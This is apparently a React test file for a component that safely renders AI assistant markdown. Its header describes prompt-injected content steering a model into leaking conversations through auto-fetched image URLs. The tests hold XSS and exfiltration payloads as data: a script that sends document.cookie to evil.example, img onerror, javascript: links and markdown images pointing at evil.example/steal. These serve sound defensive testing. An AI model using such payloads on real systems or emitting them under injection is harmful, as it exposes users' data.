import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it } from "vitest";
import MarkdownMessage from "@/components/MarkdownMessage";

/**
 * MarkdownMessage renders assistant output, and assistant output can be
 * shaped by whatever an injected email or web page told the model to say.
 * That makes this component the app's XSS *and* exfiltration boundary, so
 * these tests assert the absence of live elements and fetching attributes
 * rather than just the presence of a placeholder — a regression that swapped
 * the inert `<span>` for a real `<img>` would still show "something" on
 * screen while silently leaking the conversation to the URL's host.
 */

/**
 * Every attribute the browser dereferences on its own during render. If a
 * hostile URL never appears in one of these, nothing was fetched.
 */
const FETCHING_ATTRIBUTES = [
  "src",
  "srcset",
  "href",
  "poster",
  "background",
  "data",
  "formaction",
  "action",
];

function fetchingAttributeValues(container: HTMLElement): string[] {
  return Array.from(container.querySelectorAll("*")).flatMap((el) =>
    FETCHING_ATTRIBUTES.map((name) => el.getAttribute(name)).filter(
      (value): value is string => value !== null,
    ),
  );
}

const EXFIL_URL = "https://evil.example/steal?d=SECRET";

describe("MarkdownMessage — raw HTML is never live", () => {
  it("escapes inline HTML tags into text instead of building elements", () => {
    const { container } = render(
      <MarkdownMessage content="**real bold** and <b>fake bold</b>" />,
    );

    // Markdown emphasis still becomes an element...
    expect(container.querySelector("strong")).toHaveTextContent("real bold");
    // ...but the hand-written tag does not.
    expect(container.querySelector("b")).toBeNull();
    expect(container.textContent).toContain("<b>fake bold</b>");
  });

  it("renders a <script> block as visible text, never as a script element", () => {
    const { container } = render(
      <MarkdownMessage content={'<script>fetch("https://evil.example/?c="+document.cookie)</script>'} />,
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("<script>");
    expect(container.textContent).toContain("</script>");
  });

  it("does not build an <img> (or an onerror handler) out of raw HTML", () => {
    const raw = '<img src="https://evil.example/x.png" onerror="alert(1)">';
    const { container } = render(<MarkdownMessage content={raw} />);

    expect(container.querySelector("img")).toBeNull();
    expect(
      Array.from(container.querySelectorAll("*")).some((el) =>
        el.hasAttribute("onerror"),
      ),
    ).toBe(false);
    expect(fetchingAttributeValues(container)).toEqual([]);
    expect(container.textContent).toContain(raw);
  });

  it("does not build an anchor out of a raw <a href=javascript:> tag", () => {
    const { container } = render(
      <MarkdownMessage content={'<a href="javascript:alert(1)">click</a>'} />,
    );

    expect(container.querySelector("a")).toBeNull();
    expect(fetchingAttributeValues(container)).toEqual([]);
  });
});

describe("MarkdownMessage — images never auto-fetch (EchoLeak)", () => {
  it("replaces a markdown image with an inert placeholder", () => {
    const { container } = render(
      <MarkdownMessage content={`![quarterly chart](${EXFIL_URL})`} />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(
      screen.getByText("Image hidden for safety: quarterly chart"),
    ).toBeInTheDocument();
  });

  it("keeps the image URL out of every attribute the browser dereferences", () => {
    // The URL is allowed to survive as a tooltip (`title`) so the user can
    // inspect it; it must never reach `src`/`href`, which would make the
    // render itself the GET request that leaks the conversation.
    const { container } = render(
      <MarkdownMessage content={`![](${EXFIL_URL})`} />,
    );

    for (const value of fetchingAttributeValues(container)) {
      expect(value).not.toContain("evil.example");
    }
    expect(container.querySelector("[title]")).toHaveAttribute(
      "title",
      EXFIL_URL,
    );
    expect(screen.getByText("Image hidden for safety")).toBeInTheDocument();
  });

  it("blocks a reference-style image the same way as an inline one", () => {
    const { container } = render(
      <MarkdownMessage
        content={`![pixel][ref]\n\n[ref]: ${EXFIL_URL}`}
      />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("Image hidden for safety: pixel")).toBeInTheDocument();
  });
});

describe("MarkdownMessage — link scheme allowlist", () => {
  it("renders a javascript: link as inert text, whatever its casing", () => {
    // A `startsWith("javascript:")` check would wave the second one through;
    // the component normalizes through `new URL` instead.
    for (const href of ["javascript:alert(1)", "JaVaScRiPt:alert(1)"]) {
      const { container, unmount } = render(
        <MarkdownMessage content={`[click me](${href})`} />,
      );

      expect(container.querySelector("a")).toBeNull();
      expect(container.textContent).toContain("click me");
      for (const value of fetchingAttributeValues(container)) {
        expect(value.toLowerCase()).not.toContain("javascript:");
      }
      unmount();
    }
  });

  it("renders a data: URL link as inert text", () => {
    // data:text/html is a same-origin script-execution primitive on click.
    const { container } = render(
      <MarkdownMessage content="[open](data:text/html;base64,PHNjcmlwdD4=)" />,
    );

    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("open");
  });

  it("renders an https link with target/rel hardening", () => {
    render(<MarkdownMessage content="[docs](https://example.com/path?a=1)" />);

    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "https://example.com/path?a=1");
    expect(link).toHaveAttribute("target", "_blank");
    // noopener/noreferrer keep the opened tab from reaching back through
    // window.opener or leaking the app URL as a referrer.
    expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
    expect(link).toHaveAttribute("title", "https://example.com/path?a=1");
  });

  it("allows mailto: links and labels them with the address", () => {
    render(<MarkdownMessage content="[write us](mailto:help@example.com)" />);

    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "mailto:help@example.com");
    expect(link).toHaveTextContent("help@example.com");
  });

  it("resolves a relative link against the app origin", () => {
    render(<MarkdownMessage content="[settings](/settings)" />);

    expect(screen.getByRole("link")).toHaveAttribute(
      "href",
      `${window.location.origin}/settings`,
    );
  });

  it("shows the real destination host beside deceptive link text", () => {
    // The whole point: link text saying "bank.example" must not be able to
    // hide that the click goes to evil.example.
    render(
      <MarkdownMessage content="[https://bank.example/login](https://evil.example/phish)" />,
    );

    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "https://evil.example/phish");
    expect(link).toHaveTextContent("evil.example");
  });
});

describe("MarkdownMessage — ordinary formatting still works", () => {
  it("renders fenced code verbatim inside a pre/code block", () => {
    const { container } = render(
      <MarkdownMessage content={"```js\nconst total = 1 + 2;\n```"} />,
    );

    const code = container.querySelector("pre code");
    expect(code).toHaveClass("language-js");
    expect(code).toHaveTextContent("const total = 1 + 2;");
    expect(
      screen.getByRole("button", { name: /copy code/i }),
    ).toBeInTheDocument();
  });

  it("renders headings, lists, quotes, inline code and GFM tables", () => {
    const { container } = render(
      <MarkdownMessage
        content={[
          "# Title",
          "",
          "- first",
          "- second",
          "",
          "> quoted",
          "",
          "Use `npm run build` to check.",
          "",
          "| tool | status |",
          "| --- | --- |",
          "| gmail | ok |",
        ].join("\n")}
      />,
    );

    expect(screen.getByRole("heading", { name: "Title" })).toBeInTheDocument();
    expect(screen.getAllByRole("listitem").map((li) => li.textContent)).toEqual([
      "first",
      "second",
    ]);
    expect(container.querySelector("blockquote")).toHaveTextContent("quoted");
    expect(container.querySelector("p code")).toHaveTextContent("npm run build");
    // remark-gfm is what turns the pipe table into a real <table>.
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: "tool" })).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "gmail" })).toBeInTheDocument();
  });

  it("copies the code block's source, not its rendered markup", async () => {
    const user = userEvent.setup();
    render(<MarkdownMessage content={"```py\nprint('hi')\n```"} />);

    await user.click(screen.getByRole("button", { name: /copy code/i }));

    expect(await navigator.clipboard.readText()).toBe("print('hi')\n");
  });
});
